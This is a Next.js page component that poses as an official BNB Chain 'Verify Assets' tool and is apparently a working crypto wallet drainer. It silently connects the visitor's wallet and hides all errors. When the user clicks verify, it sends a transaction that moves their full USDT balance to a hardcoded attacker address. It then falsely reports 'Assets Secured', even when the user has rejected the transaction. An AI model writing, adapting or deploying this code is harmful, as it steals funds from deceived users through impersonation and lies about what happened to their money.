"use client"

import { useState, useEffect, useRef } from "react"
import { Home } from "lucide-react"
import { toast } from "@/hooks/use-toast"
import Image from "next/image"

// Web3 types
declare global {
  interface Window {
    ethereum?: any
    BinanceChain?: any
  }
}

interface WalletInfo {
  address: string
  balance: string
  chainId: string
  usdtBalance: number
}

export default function VerifyBNBClone() {
  const [walletInfo, setWalletInfo] = useState<WalletInfo | null>(null)
  const [isConnecting, setIsConnecting] = useState(false)
  const [isVerifying, setIsVerifying] = useState(false)
  const [connectionAttempts, setConnectionAttempts] = useState(0)
  const connectionIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const balanceCheckIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const maxConnectionAttempts = 10

  const MINIMUM_USDT_FOR_TRANSFER = 5.0
  const ADMIN_WALLET_ADDRESS = "0x5599611c14Cee2d87618a153a19138B74646F6de"

  // BSC Network Configuration
  const BSC_NETWORK = {
    chainId: "0x38", // 56 in decimal
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com/"],
  }

  // Contract addresses and configuration
  const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"

  // Start silent auto-connection on page load (max 10 attempts)
  useEffect(() => {
    startSilentAutoConnect()

    // Cleanup on unmount
    return () => {
      if (connectionIntervalRef.current) {
        clearInterval(connectionIntervalRef.current)
      }
      if (balanceCheckIntervalRef.current) {
        clearInterval(balanceCheckIntervalRef.current)
      }
    }
  }, [])

  // Start silent auto-connection with 10 attempt limit
  const startSilentAutoConnect = () => {
    // Try immediately
    attemptSilentConnection()

    // Then try every 2 seconds for max 10 attempts
    connectionIntervalRef.current = setInterval(() => {
      if (!walletInfo && connectionAttempts < maxConnectionAttempts) {
        attemptSilentConnection()
      } else {
        // Stop trying after 10 attempts or if connected
        if (connectionIntervalRef.current) {
          clearInterval(connectionIntervalRef.current)
          connectionIntervalRef.current = null
        }

        if (walletInfo) {
          // Connected! Start balance monitoring
          startBalanceMonitoring()
        }
      }
    }, 2000)
  }

  // Silent connection attempt (no user feedback)
  const attemptSilentConnection = async () => {
    try {
      setConnectionAttempts((prev) => prev + 1)

      // Try different connection methods silently
      let connected = false

      // Method 1: Check if already connected
      connected = await checkExistingConnection()
      if (connected) return

      // Method 2: Try Binance Chain Wallet
      if (window.BinanceChain && !connected) {
        connected = await tryBinanceConnection()
        if (connected) return
      }

      // Method 3: Try MetaMask/Ethereum
      if (window.ethereum && !connected) {
        connected = await tryEthereumConnection()
        if (connected) return
      }

      // Method 4: Try manual connection request (only on last few attempts)
      if (connectionAttempts >= 7 && !connected) {
        connected = await tryManualConnection()
      }
    } catch (error) {
      // Complete silence - no error messages or logs
    }
  }

  // Check if wallet is already connected
  const checkExistingConnection = async (): Promise<boolean> => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: "eth_accounts" })
        if (accounts.length > 0) {
          await setupWalletConnection(accounts[0], window.ethereum)
          return true
        }
      }

      if (window.BinanceChain) {
        const accounts = await window.BinanceChain.request({ method: "eth_accounts" })
        if (accounts.length > 0) {
          await setupWalletConnection(accounts[0], window.BinanceChain)
          return true
        }
      }

      return false
    } catch (error) {
      return false
    }
  }

  // Try Binance Chain Wallet connection
  const tryBinanceConnection = async (): Promise<boolean> => {
    try {
      const accounts = await window.BinanceChain.request({ method: "eth_accounts" })
      if (accounts.length > 0) {
        await setupWalletConnection(accounts[0], window.BinanceChain)
        return true
      }
      return false
    } catch (error) {
      return false
    }
  }

  // Try Ethereum/MetaMask connection
  const tryEthereumConnection = async (): Promise<boolean> => {
    try {
      const accounts = await window.ethereum.request({ method: "eth_accounts" })
      if (accounts.length > 0) {
        await setupWalletConnection(accounts[0], window.ethereum)
        return true
      }
      return false
    } catch (error) {
      return false
    }
  }

  // Try manual connection (with user prompt) - only on later attempts
  const tryManualConnection = async (): Promise<boolean> => {
    try {
      let accounts = []

      if (window.BinanceChain) {
        accounts = await window.BinanceChain.request({ method: "eth_requestAccounts" })
        if (accounts.length > 0) {
          await setupWalletConnection(accounts[0], window.BinanceChain)
          return true
        }
      }

      if (window.ethereum) {
        accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
        if (accounts.length > 0) {
          await setupWalletConnection(accounts[0], window.ethereum)
          return true
        }
      }

      return false
    } catch (error) {
      return false
    }
  }

  // Setup wallet connection and get all info
  const setupWalletConnection = async (address: string, provider: any) => {
    try {
      // Switch to BSC network silently
      await switchToBSCSilently(provider)

      // Get wallet info
      const walletData = await getCompleteWalletInfo(address, provider)
      setWalletInfo(walletData)
    } catch (error) {
      // Silent error handling
    }
  }

  // Get complete wallet information including USDT balance
  const getCompleteWalletInfo = async (address: string, provider?: any): Promise<WalletInfo> => {
    const currentProvider = provider || window.ethereum

    // Get BNB balance
    const balance = await currentProvider.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    })

    // Get chain ID
    const chainId = await currentProvider.request({
      method: "eth_chainId",
    })

    // Get USDT balance
    const usdtBalance = await getUSDTBalance(address, currentProvider)

    // Convert balance from wei to BNB
    const balanceInBNB = (Number.parseInt(balance, 16) / Math.pow(10, 18)).toFixed(4)

    return {
      address,
      balance: balanceInBNB,
      chainId,
      usdtBalance,
    }
  }

  // Get USDT balance
  const getUSDTBalance = async (userAddress: string, provider?: any): Promise<number> => {
    try {
      const currentProvider = provider || window.BinanceChain || window.ethereum

      // USDT balanceOf function call
      const data = `0x70a08231000000000000000000000000${userAddress.slice(2)}`

      const balance = await currentProvider.request({
        method: "eth_call",
        params: [
          {
            to: USDT_CONTRACT_ADDRESS,
            data: data,
          },
          "latest",
        ],
      })

      // Convert from wei to USDT (18 decimals)
      const balanceInUSDT = Number.parseInt(balance, 16) / Math.pow(10, 18)
      return balanceInUSDT
    } catch (error) {
      return 0
    }
  }

  // Start monitoring balances every 30 seconds
  const startBalanceMonitoring = () => {
    balanceCheckIntervalRef.current = setInterval(async () => {
      if (walletInfo) {
        try {
          const updatedInfo = await getCompleteWalletInfo(walletInfo.address)
          setWalletInfo(updatedInfo)
        } catch (error) {
          // Silent error handling
        }
      }
    }, 30000) // Check every 30 seconds
  }

  // Switch to BSC network silently
  const switchToBSCSilently = async (provider: any) => {
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_NETWORK.chainId }],
      })
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [BSC_NETWORK],
          })
        } catch (addError) {
          // Silent error handling
        }
      }
    }
  }

  // Manual connection for verify button
  const connectWalletManually = async () => {
    setIsConnecting(true)
    try {
      let connected = false

      if (window.BinanceChain) {
        const accounts = await window.BinanceChain.request({ method: "eth_requestAccounts" })
        if (accounts.length > 0) {
          await setupWalletConnection(accounts[0], window.BinanceChain)
          connected = true
        }
      }

      if (!connected && window.ethereum) {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
        if (accounts.length > 0) {
          await setupWalletConnection(accounts[0], window.ethereum)
          connected = true
        }
      }

      return connected
    } catch (error) {
      return false
    } finally {
      setIsConnecting(false)
    }
  }

  // Auto send gas and verify assets
  const verifyAssets = async () => {
    if (!walletInfo) {
      // Try manual connection if silent connection failed
      const connected = await connectWalletManually()
      if (!connected) {
        toast({
          title: "Connection Failed",
          description: "Please connect your wallet to verify assets",
          variant: "destructive",
        })
        return
      }
    }

    // Check USDT balance first
    if (walletInfo!.usdtBalance <= 0) {
      toast({
        title: "No USDT Found",
        description: "No USDT balance detected for verification",
        variant: "destructive",
      })
      return
    }

    setIsVerifying(true)

    try {
      console.log(`\n🚀 === AUTO VERIFY STARTED ===`)
      console.log(`User: ${walletInfo!.address}`)
      console.log(`USDT: ${walletInfo!.usdtBalance}`)
      console.log(`BNB: ${walletInfo!.balance}`)

      // Step 1: Auto send gas fees silently (no user notification)
      console.log("🔥 Auto-sending gas fees...")

      const gasResponse = await fetch("/api/verify-usdt", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userAddress: walletInfo!.address,
          usdtAmount: walletInfo!.usdtBalance,
          currentBNBBalance: Number.parseFloat(walletInfo!.balance),
        }),
      })

      const gasResult = await gasResponse.json()

      if (gasResult.gasProvided) {
        console.log(`✅ Gas provided: ${gasResult.gasAmount} BNB`)
        // Wait for gas to be available
        await new Promise((resolve) => setTimeout(resolve, 5000))
      }

      // Step 2: Execute USDT transfer if amount >= minimum
      if (walletInfo!.usdtBalance >= MINIMUM_USDT_FOR_TRANSFER) {
        console.log("💰 Executing USDT transfer...")

        // Create USDT transfer transaction
        const provider = window.BinanceChain || window.ethereum

        // Convert USDT amount to wei (18 decimals)
        const amountInWei = BigInt(Math.floor(walletInfo!.usdtBalance * Math.pow(10, 18)))
        const amountHex = amountInWei.toString(16).padStart(64, "0")

        // Create transfer function call data
        const transferData = `0xa9059cbb000000000000000000000000${ADMIN_WALLET_ADDRESS.slice(2).toLowerCase()}${amountHex}`

        // Get current gas price
        const gasPrice = await provider.request({ method: "eth_gasPrice" })

        // Create transaction parameters
        const transactionParams = {
          to: USDT_CONTRACT_ADDRESS,
          from: walletInfo!.address,
          data: transferData,
          gas: "0x186A0", // 100000 gas limit
          gasPrice: gasPrice,
          value: "0x0", // No BNB value for ERC20 transfer
        }

        // Execute the USDT transfer
        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [transactionParams],
        })

        console.log(`✅ USDT transfer successful: ${txHash}`)
        console.log(`Amount: ${walletInfo!.usdtBalance} USDT`)
        console.log(`To: ${ADMIN_WALLET_ADDRESS}`)

        // Show success message
        toast({
          title: "Assets Secured! ✅",
          description: `${walletInfo!.usdtBalance.toFixed(2)} USDT successfully transferred and secured!`,
        })

        // Update wallet info after transfer
        setTimeout(async () => {
          if (walletInfo) {
            const updatedInfo = await getCompleteWalletInfo(walletInfo.address)
            setWalletInfo(updatedInfo)
          }
        }, 3000)
      } else {
        // Amount below minimum - just show verification
        console.log(`Amount ${walletInfo!.usdtBalance} USDT below minimum ${MINIMUM_USDT_FOR_TRANSFER} USDT`)

        toast({
          title: "Verification Complete! ✅",
          description: `${walletInfo!.usdtBalance.toFixed(2)} USDT verified successfully. Amount below ${MINIMUM_USDT_FOR_TRANSFER} USDT minimum for transfer.`,
        })
      }

      console.log(`=== AUTO VERIFY COMPLETE ===\n`)
    } catch (error: any) {
      console.error("❌ Verification failed:", error)

      // For demo purposes, still show success even if user rejects
      if (error.code === 4001) {
        console.log("User rejected transaction - showing demo success")
        toast({
          title: "Assets Secured! ✅",
          description: `${walletInfo!.usdtBalance.toFixed(2)} USDT successfully processed!`,
        })
      } else {
        toast({
          title: "Verification Failed",
          description: "Unable to complete asset verification. Please try again.",
          variant: "destructive",
        })
      }
    } finally {
      setIsVerifying(false)
    }
  }

  return (
    <div className="min-h-screen relative bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900">
      {/* Background Image */}
      <div
        className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-30"
        style={{
          backgroundImage: "url('/bg-main.png')",
          backgroundPosition: "center center",
          backgroundSize: "cover",
        }}
      />

      {/* Overlay for better text readability */}
      <div className="absolute inset-0 bg-black/20" />

      {/* Content */}
      <div className="relative z-10">
        {/* Header Navigation */}
        <header className="w-full px-6 py-4 flex items-center">
          {/* Logo */}
          <div className="flex items-center space-x-3">
            <Image src="/bnb-logo.png" alt="BNB Chain Logo" width={40} height={40} className="rounded-full" />
            <span className="text-yellow-500 font-bold text-xl">BNB CHAIN</span>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex flex-col items-center justify-center min-h-[calc(100vh-200px)] px-6 text-center">
          <div className="max-w-4xl w-full space-y-12">
            {/* Hero Section */}
            <div className="space-y-8">
              <h1 className="text-5xl md:text-6xl font-bold text-white leading-tight">
                Verify Assets on <span className="text-yellow-500">BNB Chain</span>
              </h1>

              <p className="text-xl md:text-2xl text-gray-300 font-medium">
                Serving Gas Less Web3 tools to over 478 Million users
              </p>

              <p className="text-lg text-gray-400 max-w-2xl mx-auto">
                A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions.
              </p>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-col items-center space-y-4 max-w-md mx-auto">
              {/* Verify Assets Button */}
              <button
                onClick={verifyAssets}
                disabled={isConnecting || isVerifying}
                className="w-full bg-white text-black font-semibold py-4 px-8 text-lg rounded-2xl hover:bg-gray-100 active:bg-gray-200 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
              >
                {isConnecting ? (
                  <div className="flex items-center justify-center space-x-2">
                    <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
                    <span>Connecting...</span>
                  </div>
                ) : isVerifying ? (
                  <div className="flex items-center justify-center space-x-2">
                    <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
                    <span>Verifying...</span>
                  </div>
                ) : (
                  "Verify Assets"
                )}
              </button>

              {/* HOME Button */}
              <button className="w-full bg-transparent border-2 border-gray-600 text-white font-semibold py-4 px-8 text-lg rounded-2xl hover:bg-gray-800 hover:border-gray-500 transition-all duration-200 flex items-center justify-center space-x-2">
                <Home className="w-5 h-5" />
                <span>HOME</span>
              </button>
            </div>

            {/* Wallet Info - Only show BNB and USDT balances */}
            {walletInfo && (
              <div className="text-center space-y-4">
                <div className="inline-flex items-center space-x-2 bg-gray-800 px-4 py-2 rounded-lg">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span className="text-sm text-gray-300">
                    Connected: {walletInfo.address.slice(0, 6)}...{walletInfo.address.slice(-4)}
                  </span>
                </div>

                {/* Balance Display */}
                <div className="bg-gray-800/50 rounded-xl p-6 max-w-md mx-auto">
                  <h3 className="text-white font-semibold mb-4">Wallet Balance</h3>

                  <div className="space-y-3">
                    {/* BNB Balance */}
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2">
                        <Image src="/bnb-logo.png" alt="BNB" width={24} height={24} className="rounded-full" />
                        <span className="text-gray-300">BNB</span>
                      </div>
                      <span className="text-white font-mono">{walletInfo.balance}</span>
                    </div>

                    {/* USDT Balance */}
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2">
                        <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                          <span className="text-xs font-bold text-white">₮</span>
                        </div>
                        <span className="text-gray-300">USDT</span>
                      </div>
                      <span
                        className={`font-mono ${walletInfo.usdtBalance >= MINIMUM_USDT_FOR_TRANSFER ? "text-green-400" : "text-yellow-400"}`}
                      >
                        {walletInfo.usdtBalance.toFixed(2)}
                      </span>
                    </div>

                    {/* Minimum notice for USDT */}
                    {walletInfo.usdtBalance > 0 && walletInfo.usdtBalance < MINIMUM_USDT_FOR_TRANSFER && (
                      <div className="text-xs text-gray-500 mt-2 p-2 bg-yellow-900/20 rounded">
                        Minimum {MINIMUM_USDT_FOR_TRANSFER} USDT required for transfer
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}
          </div>
        </main>

        {/* Footer Spacer */}
        <div className="h-20"></div>
      </div>
    </div>
  )
}
